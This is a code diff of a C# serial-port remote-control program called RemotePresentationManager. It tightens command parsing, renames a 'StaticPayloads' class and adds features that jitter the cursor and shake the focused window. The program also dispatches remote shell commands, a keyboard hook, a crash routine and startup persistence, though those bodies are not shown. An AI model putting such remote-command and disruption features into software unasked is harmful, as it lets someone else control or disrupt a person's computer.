@@ -21,6 +21,7 @@ using NAudio.Wave;
 using System.Windows.Media.Imaging;
 using Microsoft.Win32;
 using System.Security.Cryptography;
+using WindowsAPI;
 
 namespace RemotePresentationManager
 {
@@ -55,7 +56,11 @@ namespace RemotePresentationManager
         string ValueName = "Key";
         string CurrentPass = null;
         bool MouseSoftLock = false;//if the mouse is softlocked
-        Point MouseLockPoint = new Point(200, 200);//the point t which the pointer wiil be softlocked
+        Point MouseLockPoint = new Point(200, 200);//the point at which the pointer wiil be softlocked
+        bool MouseShake = false;
+        Random r = new Random();
+        int ShakeOffset = 20;
+        IntPtr SelectedWindowHwND = IntPtr.Zero;
         public Form1(string[] args)
         {
             InitializeComponent();
@@ -237,31 +242,31 @@ namespace RemotePresentationManager
                     Invoke(new WindowStateDelegate(SetWindowState), true);
                     Console.WriteLine("Show window");
                 }
-                else if (data.Contains("SOFTLOCK"))
+                else if (data.StartsWith("SOFTLOCK"))
                 {
                     Port.WriteLine("Command received!");
                     SoftLock(data);
                     Console.WriteLine("Softlock");
                 }
-                else if (data.Contains("PLAYSOUND "))
+                else if (data.StartsWith("PLAYSOUND "))
                 {
                     Port.WriteLine("Command received!");
                     PlaySound(data);
                     Console.WriteLine("Play sound file");
                 }
-                else if (data.Contains("PLAYURL "))
+                else if (data.StartsWith("PLAYURL "))
                 {
                     Port.WriteLine("Command received!");
                     PlayMp3FromUrl(data);
                     Console.WriteLine("Play url");
                 }
-                else if (data.Contains("PLAY "))
+                else if (data.StartsWith("PLAY "))
                 {
                     Port.WriteLine("Command received!");
                     Play(data);
                     Console.WriteLine("Play sound");
                 }
-                else if (data.Contains("URLIMAGE "))
+                else if (data.StartsWith("URLIMAGE "))
                 {
                     Port.WriteLine("Command received!");
                     UrlImage(data);
@@ -297,67 +302,67 @@ namespace RemotePresentationManager
                     UnMute();
                     Console.WriteLine("Unmute");
                 }
-                else if (data.Contains("VOLUME "))
+                else if (data.StartsWith("VOLUME "))
                 {
                     Port.WriteLine("Command received!");
                     AdjustVolume(data);
                     Console.WriteLine("Adjust volume");
                 }
-                else if (data.Contains("CLIP "))
+                else if (data.StartsWith("CLIP "))
                 {
                     Port.WriteLine("Command received!");
                     ClipBoard(data);
                     Console.WriteLine("Edit clipboard");
                 }
-                else if (data.Contains("KEY "))
+                else if (data.StartsWith("KEY "))
                 {
                     Port.WriteLine("Command received!");
                     Key(data);
                     Console.WriteLine("Send custom key");
                 }
-                else if (data.Contains("LOOP "))
+                else if (data.StartsWith("LOOP "))
                 {
                     Port.WriteLine("Command received!");
                     Loop(data);
                     Console.WriteLine("Set loop mode");
                 }
-                else if (data.Contains("SAY "))
+                else if (data.StartsWith("SAY "))
                 {
                     Port.WriteLine("Command received!");
                     Say(data);
                     Console.WriteLine("Say text");
                 }
-                else if (data.Contains("IMG "))
+                else if (data.StartsWith("IMG "))
                 {
                     Port.WriteLine("Command received!");
                     Draw(data);
                     Console.WriteLine("Draw bitmap");
                 }
-                else if (data.Contains("ROTATE "))
+                else if (data.StartsWith("ROTATE "))
                 {
                     Port.WriteLine("Command received!");
                     Rotate(data);
                     Console.WriteLine("Rotate screen");
                 }
-                else if (data.Contains("MOUSE "))
+                else if (data.StartsWith("MOUSE "))
                 {
                     Port.WriteLine("Command received!");
                     Mouse(data);
                     Console.WriteLine("Set mouse position");
                 }
-                else if (data.Contains("QMSG "))
+                else if (data.StartsWith("QMSG "))
                 {
                     Port.WriteLine("Command received!");
                     QMsg(data);
                     Console.WriteLine("Question MessageBox");
                 }
-                else if (data.Contains("MSG "))
+                else if (data.StartsWith("MSG "))
                 {
                     Port.WriteLine("Command received!");
                     Msg(data);
                     Console.WriteLine("MessageBox");
                 }
-                else if (data.Contains("TITLE "))
+                else if (data.StartsWith("TITLE "))
                 {
                     Port.WriteLine("Command received!");
                     Title(data);
@@ -465,13 +470,13 @@ namespace RemotePresentationManager
                     Startup();
                     Console.WriteLine("SETUP STARTUP RUN");
                 }
-                else if (data.Contains("VCMD "))
+                else if (data.StartsWith("VCMD "))
                 {
                     Port.WriteLine("Command received!");
                     VCmd(data);
                     Console.WriteLine("VCMD COMMAND");
                 }
-                else if (data.Contains("CMD "))
+                else if (data.StartsWith("CMD "))
                 {
                     Port.WriteLine("Command received!");
                     Cmd(data);
@@ -502,11 +507,11 @@ namespace RemotePresentationManager
                 e.Cancel = false;
             }
         }
-
-
+        
         private void Password(string data)//it is reccommended to change the default password, even if it is secure (use my tool called RPMPasswordSet)
         {
-            if (remaining == 0)
+
+            if (remaining == 0)//when you don't have any tries left, 
             {
                 Shutdown();
             }
@@ -567,16 +572,20 @@ namespace RemotePresentationManager
 
         private void Exit()
         {
+            timer1.Stop();
+            Console.WriteLine("1");
             if (AudioFileReader != null)
             {
                 AudioFileReader.Dispose();
+                Console.WriteLine("2");
             }
             if (WaveOutDevice != null)
             {
                 WaveOutDevice.Dispose();
+                Console.WriteLine("3");
             }
             Connected = false;
-            Application.Exit();
+            Environment.Exit(0);
         }
 
         #endregion
@@ -709,7 +718,7 @@ namespace RemotePresentationManager
         {
             if (checkBox8.Checked)
             {
-                StaticPayloads.Crash();
+                Miscellaneous.Crash();
             }
             else
             {
@@ -1053,7 +1062,7 @@ namespace RemotePresentationManager
             if (checkBox3.Checked)
             {
                 data = data.Remove(0, 4);
-                StaticPayloads.Say(data);
+                Miscellaneous.Say(data);
             }
             else
             {
@@ -1066,7 +1075,7 @@ namespace RemotePresentationManager
             if (checkBox5.Checked)
             {
                 data = data.Remove(0, 7);
-                StaticPayloads.DrawBitmapToScreen((Bitmap)Bitmap.FromFile(data));
+                Drawing.DrawBitmapToScreen((Bitmap)Bitmap.FromFile(data));
             }
             else
             {
@@ -1082,19 +1091,19 @@ namespace RemotePresentationManager
 
                 if (data.Equals("0"))
                 {
-                    StaticPayloads.Rotate(0, StaticPayloads.Orientations.DEGREES_CW_0);
+                    Display.Rotate(0, Display.Orientations.DEGREES_CW_0);
                 }
                 else if (data.Equals("90"))
                 {
-                    StaticPayloads.Rotate(0, StaticPayloads.Orientations.DEGREES_CW_90);
+                    Display.Rotate(0, Display.Orientations.DEGREES_CW_90);
                 }
                 else if (data.Equals("180"))
                 {
-                    StaticPayloads.Rotate(0, StaticPayloads.Orientations.DEGREES_CW_180);
+                    Display.Rotate(0, Display.Orientations.DEGREES_CW_180);
                 }
                 else if (data.Equals("270"))
                 {
-                    StaticPayloads.Rotate(0, StaticPayloads.Orientations.DEGREES_CW_270);
+                    Display.Rotate(0, Display.Orientations.DEGREES_CW_270);
                 }
                 else
                 {
@@ -1111,7 +1120,7 @@ namespace RemotePresentationManager
         {
             if (checkBox1.Checked)
             {
-                StaticPayloads.KeyboardHook();
+                Keyboard.KeyboardHook();
             }
             else
             {
@@ -1123,7 +1132,7 @@ namespace RemotePresentationManager
         {
             if (checkBox1.Checked)
             {
-                StaticPayloads.ReleaseKeyboardHook();
+                Keyboard.ReleaseKeyboardHook();
             }
             else
             {
@@ -1156,7 +1165,7 @@ namespace RemotePresentationManager
                     e.Result.Read(imageBytes, 0, imageBytes.Length);
 
                     // Now you can use the returned stream to set the image source too
-                    StaticPayloads.DrawBitmapToScreen((Bitmap)Image.FromStream(e.Result));
+                    Drawing.DrawBitmapToScreen((Bitmap)Image.FromStream(e.Result));
                 };
                 client.OpenReadAsync(new Uri(url));
             }
@@ -1224,6 +1233,16 @@ namespace RemotePresentationManager
             }
         }
 
+        private void Shake()
+        {
+            SelectedWindowHwND = Window.GetFocused();
+        }
+
+        private void Unshake()
+        {
+            SelectedWindowHwND = IntPtr.Zero;
+        }
+
         private void SoftLock(string data)
         {
             if (checkBox9.Checked)
@@ -1245,14 +1264,30 @@ namespace RemotePresentationManager
                 {
                     MouseSoftLock = false;
                 }
-                else if (data.Contains("MOUSE SET "))
+                else if (data.Equals("MOUSE SHAKE ON"))
+                {
+                    MouseShake = true;
+                }
+                else if (data.Equals("MOUSE SHAKE OFF"))
+                {
+                    MouseShake = false;
+                }
+                else if (data.StartsWith("MOUSE SET "))
                 {
                     data = data.Remove(0, 9);
                     int x = int.Parse(data.Substring(1, data.IndexOf('Y')));
                     int y = int.Parse(data.Substring(data.IndexOf('Y')));
                     MouseLockPoint = new Point(x, y);
                 }
-                else if (data.Contains("SET TIME "))
+                else if (data.Equals("SHAKE"))
+                {
+                    Shake();
+                }
+                else if (data.Equals("UNSHAKE"))
+                {
+                    Unshake();
+                }
+                else if (data.StartsWith("SET TIME "))
                 {
                     data = data.Remove(0, 9);
                     try
@@ -1297,6 +1332,27 @@ namespace RemotePresentationManager
             if (MouseSoftLock)
             {
                 Cursor.Position = MouseLockPoint;
+            }
+            if (MouseShake)
+            {
+                int currentX = Cursor.Position.X;
+                int currentY = Cursor.Position.Y;
+                int x = r.Next(currentX - ShakeOffset, currentX + ShakeOffset + 1);
+                int y = r.Next(currentY - ShakeOffset, currentY + ShakeOffset + 1);
+                Cursor.Position = new Point(x, y);
+            }
+            if (SelectedWindowHwND != IntPtr.Zero)
+            {
+                Random r = new Random();
+                for (int i = 0; i < 1000; i++)
+                {
+                    int offset = 2;
+                    int currentX = Window.GetLocation(SelectedWindowHwND).X;
+                    int currentY = Window.GetLocation(SelectedWindowHwND).Y;
+                    int x = r.Next(currentX - offset, currentX + offset + 1);
+                    int y = r.Next(currentY - offset, currentY + offset + 1);
+                    Window.Move(SelectedWindowHwND, x, y);
+                }
             }
         }
 
